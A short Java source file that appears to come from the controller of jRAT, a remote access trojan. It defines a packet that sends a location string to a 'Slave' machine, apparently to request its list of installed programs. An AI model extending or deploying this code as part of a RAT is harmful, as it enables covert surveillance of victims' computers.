package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet81InstalledPrograms implements OutgoingPacket {

	private String location;

	public Packet81InstalledPrograms(String location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(location);
	}

	@Override
	public short getPacketId() {
		return 81;
	}

}
